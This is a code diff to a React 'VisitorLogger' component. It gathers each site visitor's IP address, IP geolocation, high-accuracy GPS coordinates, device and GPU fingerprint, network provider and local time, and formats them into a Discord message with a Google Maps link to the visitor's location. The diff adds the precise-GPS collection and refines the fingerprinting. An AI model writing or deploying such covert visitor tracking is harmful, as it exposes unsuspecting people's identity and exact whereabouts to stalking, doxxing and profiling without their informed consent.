@@ -12,14 +12,14 @@ export default function VisitorLogger() {
       try {
         // --- 1. GATHER DATA ---
         
-        // A. Network Identity (Prioritize IPv4)
+        // A. Network Identity (Initial IP-based)
         const [ipRes, locRes] = await Promise.all([
           fetch('https://api.ipify.org?format=json'),
           fetch('https://ipapi.co/json/')
         ]).catch(() => [null, null])
 
         let userIp = 'Unknown'
-        let data = { city: 'Unknown', region: 'Unknown', country_name: 'Unknown', org: 'Unknown' }
+        let data = { city: 'Unknown', region: 'Unknown', country_name: 'Unknown', org: 'Unknown', latitude: 0, longitude: 0 }
 
         if (ipRes) {
           const ipData = await ipRes.json()
@@ -29,7 +29,29 @@ export default function VisitorLogger() {
           data = await locRes.json()
         }
 
-        // B. Hardware Fingerprint
+        // B. Precise Location Attempt (GPS)
+        const getGPSLocation = () => {
+          return new Promise((resolve) => {
+            if (!navigator.geolocation) return resolve(null);
+            navigator.geolocation.getCurrentPosition(
+              (pos) => resolve({
+                lat: pos.coords.latitude.toFixed(6),
+                lon: pos.coords.longitude.toFixed(6),
+                accuracy: `±${Math.round(pos.coords.accuracy)}m`,
+                source: '📍 Precise (GPS)'
+              }),
+              () => resolve(null),
+              { enableHighAccuracy: true, timeout: 6000 }
+            );
+          });
+        };
+
+        const gps = await getGPSLocation();
+        const finalLat = gps ? gps.lat : data.latitude;
+        const finalLon = gps ? gps.lon : data.longitude;
+        const locationSource = gps ? gps.source : '🏠 Approximate (IP)';
+
+        // C. Hardware Fingerprint
         const getDeviceInfo = async () => {
           const ua = navigator.userAgent;
           const uad = navigator.userAgentData;
@@ -39,7 +61,6 @@ export default function VisitorLogger() {
           let model = "";
 
           if (uad) {
-            // Modern browsers (Chrome, Edge, etc.)
             const brand = uad.brands.find(b => b.brand !== 'Not A;Brand');
             browser = brand ? brand.brand : "Unknown Browser";
             os = uad.platform || "Unknown OS";
@@ -49,16 +70,10 @@ export default function VisitorLogger() {
               if (entropy.model && entropy.model !== "") {
                 model = ` (${entropy.model})`;
               } else if (ua.includes("Windows")) {
-                // If model is empty on Windows, it often means it's a PC
                 model = " (PC)";
-              }
-              if (entropy.platformVersion) {
-                // platformVersion for Windows is usually the major version or build
-                // but it's hard to map precisely to 10/11 without a map.
               }
             } catch (e) {}
           } else {
-            // Fallback to legacy UA parsing
             if (ua.includes("Firefox/")) browser = "Firefox";
             else if (ua.includes("Edg/")) browser = "Edge";
             else if (ua.includes("Chrome/")) browser = "Chrome";
@@ -93,8 +108,15 @@ export default function VisitorLogger() {
         const gpu = getGPU()
 
         const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection
-        const connType = connection ? connection.effectiveType : 'Unknown'
-        const connSpeed = connection ? `${connection.downlink} Mbps` : 'Unknown'
+        const rawType = connection ? connection.effectiveType : 'Unknown'
+        const downlink = connection ? connection.downlink : 0
+        
+        // Browsers cap effectiveType at '4g'. We use speed to detect 5G/Fiber.
+        let connDisplay = rawType.toUpperCase()
+        if (downlink > 15) connDisplay = '5G / High Speed'
+        if (downlink > 100) connDisplay = 'Ultra Fast / Fiber'
+        
+        const connSpeed = downlink ? `${downlink} Mbps` : 'Unknown Speed'
         
         const cores = navigator.hardwareConcurrency || 'Unknown'
         const ram = navigator.deviceMemory ? `~${navigator.deviceMemory} GB` : 'Unknown'
@@ -115,7 +137,8 @@ export default function VisitorLogger() {
         const currentPath = window.location.pathname
         
         const dateOptions = { day: 'numeric', month: 'long', year: 'numeric' }
-        const localTime = `${new Date().toLocaleDateString('en-GB', dateOptions)}, ${new Date().toLocaleTimeString()}`
+        const timeOptions = { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true }
+        const localTime = `${new Date().toLocaleDateString('en-GB', dateOptions)}, ${new Date().toLocaleTimeString('en-US', timeOptions)}`
         const isDarkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
 
         // --- 2. FORMAT DISCORD MESSAGE ---
@@ -125,8 +148,8 @@ export default function VisitorLogger() {
             color: 0x2f3136, 
             fields: [
               { 
-                name: "🏠 Identity", 
-                value: `**IP:** \`${userIp}\`\n**Location:** ${data.city}, ${data.region}, ${data.country_name}\n📍 [View on Google Maps](https://www.google.com/maps/search/?api=1&query=${data.latitude},${data.longitude})`, 
+                name: "🏠 Identity & Location", 
+                value: `**IP:** \`${userIp}\`\n**Source:** \`${locationSource}\`${gps ? ` (${gps.accuracy})` : ''}\n**Location:** ${data.city}, ${data.region}, ${data.country_name}\n📍 [View on Google Maps](https://www.google.com/maps/search/?api=1&query=${finalLat},${finalLon})`, 
                 inline: false 
               },
               {
@@ -146,7 +169,7 @@ export default function VisitorLogger() {
               },
               { 
                 name: "🌐 Network", 
-                value: `**Type:** ${connType} (${connSpeed})\n**Provider:** ${data.org || 'Unknown'}`, 
+                value: `**Type:** ${connDisplay}\n**Speed:** ${connSpeed}\n**Provider:** ${data.org || 'Unknown'}`, 
                 inline: false 
               },
               { 
